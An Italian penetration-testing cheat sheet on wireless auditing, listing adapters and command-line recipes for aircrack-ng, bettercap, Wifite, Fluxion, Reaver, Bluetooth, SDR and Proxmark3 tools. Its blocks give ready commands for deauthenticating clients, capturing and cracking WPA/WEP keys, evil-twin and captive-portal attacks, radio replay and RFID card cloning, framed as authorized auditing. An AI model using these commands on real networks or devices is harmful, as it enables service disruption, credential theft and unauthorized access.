# Wireless Tools

## Scopo

Questa guida copre tool per auditing di reti wireless, inclusi WiFi, Bluetooth e altri protocolli radio per penetration testing.

## Prerequisiti

- Scheda WiFi con monitor mode
- Kali Linux o distro security
- Driver compatibili
- **Autorizzazione per testing**

---

## Hardware

### WiFi Adapters (Consigliati)

| Adapter | Chipset | Features |
|---------|---------|----------|
| Alfa AWUS036ACH | RTL8812AU | AC, dual band |
| Alfa AWUS036NHA | Atheros AR9271 | Monitor, injection |
| TP-Link TL-WN722N v1 | Atheros | Budget option |
| Panda PAU09 | Ralink RT5572 | Dual band |

### Bluetooth

| Device | Uso |
|--------|-----|
| Ubertooth One | BLE sniffing |
| Sena UD100 | Long range |
| CSR 4.0 Dongle | Basic scanning |

### Software Wireless

| Tool | Uso |
|------|-----|
| Wifite2 | Automated WiFi attacks |
| hostapd | Rogue AP creation |
| EAPHammer | Evil twin for WPA-Enterprise |
| mdk4 | Deauth e beacon flooding |
| Spooftooph | Bluetooth spoofing |
| Reaver | WPS attacks |
| WiGLE | Wardriving database |
| Fern Wi-Fi Cracker | GUI wireless auditing |

---

## Monitor Mode

### Gestione Interfacce

```bash
# Check interfaces
iwconfig
iw dev

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0
# O
ip link set wlan0 down
iw wlan0 set monitor control
ip link set wlan0 up

# Verify
iwconfig wlan0mon

# Disable
airmon-ng stop wlan0mon
```

---

## Aircrack-ng Suite

### Scanning

```bash
# Scansione reti
airodump-ng wlan0mon

# Canale specifico
airodump-ng -c 6 wlan0mon

# Salva capture
airodump-ng -c 6 --bssid AP_MAC -w capture wlan0mon

# 5GHz
airodump-ng --band a wlan0mon
```

### Deauthentication

```bash
# Singolo client
aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon

# Tutti i client
aireplay-ng -0 0 -a AP_MAC wlan0mon
```

### WPA/WPA2 Cracking

```bash
# Cattura handshake
airodump-ng -c 6 --bssid AP_MAC -w capture wlan0mon
# Deauth per forzare handshake
aireplay-ng -0 5 -a AP_MAC wlan0mon

# Verifica handshake
aircrack-ng capture-01.cap

# Crack con wordlist
aircrack-ng -w rockyou.txt -b AP_MAC capture-01.cap

# Crack con hashcat (più veloce)
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 22000 capture.hccapx rockyou.txt
```

### WEP Cracking

```bash
# Cattura IVs
airodump-ng -c 6 --bssid AP_MAC -w wep wlan0mon

# Fake auth
aireplay-ng -1 0 -a AP_MAC wlan0mon

# ARP replay
aireplay-ng -3 -b AP_MAC wlan0mon

# Crack
aircrack-ng wep-01.cap
```

### Injection Test

```bash
aireplay-ng --test wlan0mon
```

---

## Bettercap

### Setup

```bash
# Installazione
apt install bettercap

# Avvio
bettercap -iface wlan0mon
```

### WiFi Recon

```bash
# Enable WiFi
> wifi.recon on

# Show access points
> wifi.show

# Show clients
> wifi.show.clients

# Target AP
> set wifi.recon.channel 6
```

### Attacks

```bash
# Deauth
> wifi.deauth AP_BSSID

# All clients
> wifi.deauth all

# Handshake capture
> set wifi.handshakes.file handshakes/
> wifi.assoc all
```

### Evil Twin

```bash
# Create AP
> set wifi.ap.ssid "FreeWiFi"
> set wifi.ap.channel 6
> wifi.recon on
> wifi.ap
```

---

## Wifite

```bash
# Automated WiFi auditing
wifite

# Options
wifite -c 6  # Channel
wifite -e "TARGET_SSID"  # Target
wifite --wpa  # Only WPA
wifite --kill  # Kill processes
wifite --dict rockyou.txt  # Wordlist
```

---

## Fluxion

```bash
# Evil twin + captive portal
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
./fluxion.sh

# Workflow:
# 1. Scan networks
# 2. Select target
# 3. Capture handshake
# 4. Create evil twin
# 5. Captive portal attack
```

---

## Kismet

```bash
# Installazione
apt install kismet

# Avvio
kismet

# Web interface
http://localhost:2501

# CLI
kismet_client

# Log analysis
kismet_reader -l file.pcap
```

---

## Reaver (WPS)

```bash
# Scan WPS
wash -i wlan0mon

# Attack
reaver -i wlan0mon -b AP_MAC -vv

# Pixie Dust
reaver -i wlan0mon -b AP_MAC -K 1 -vv

# Bully (alternativa)
bully -b AP_MAC -c 6 wlan0mon -d -v 3
```

---

## Bluetooth Tools

### Scanning

```bash
# hcitool
hcitool scan
hcitool lescan

# bluetoothctl
bluetoothctl
> scan on

# btscanner
btscanner
```

### Ubertooth

```bash
# BLE sniffing
ubertooth-btle -f

# Follow connection
ubertooth-btle -f -t ADDR

# Spectrum analysis
ubertooth-specan
```

### BlueZ

```bash
# L2CAP ping
l2ping ADDR

# SDP scan
sdptool browse ADDR

# RFCOMM
rfcomm connect 0 ADDR 1
```

### Bettercap BLE

```bash
> ble.recon on
> ble.show
> ble.enum MAC
> ble.write MAC UUID DATA
```

---

## SDR Tools

### RTL-SDR

```bash
# Installazione
apt install rtl-sdr

# Test
rtl_test

# Scan
rtl_power -f 400M:500M:1M -g 50 -i 1 scan.csv
```

### GQRX

```bash
# GUI SDR receiver
apt install gqrx-sdr
gqrx
```

### HackRF

```bash
# Replay attack
hackrf_transfer -r capture.raw -f 433920000 -s 2000000
hackrf_transfer -t capture.raw -f 433920000 -s 2000000
```

---

## RFID Tools

### Proxmark3

```bash
# HF scan
proxmark3> hf search

# LF scan  
proxmark3> lf search

# Clone
proxmark3> lf em 410x_clone --id CARD_ID

# Dump
proxmark3> hf mf dump
```

---

## Wordlists WiFi

```bash
# Rockyou
/usr/share/wordlists/rockyou.txt

# WiFi specific
/usr/share/wordlists/wifite.txt

# Generate custom
crunch 8 8 0123456789 -o pins.txt

# Common patterns
hashcat --stdout -a 3 ?d?d?d?d?d?d?d?d > 8digits.txt
```

---

## Best Practices

- **Legal**: Solo reti autorizzate
- **Antenna**: Qualità antenna
- **Channel hop**: Copri tutti canali
- **Documentation**: Log attività
- **Cleanup**: Rimuovi AP fake

## Riferimenti

- [Aircrack-ng](https://www.aircrack-ng.org/)
- [Bettercap](https://www.bettercap.org/)
- [Wifite](https://github.com/derv82/wifite2)
- [Kismet](https://www.kismetwireless.net/)
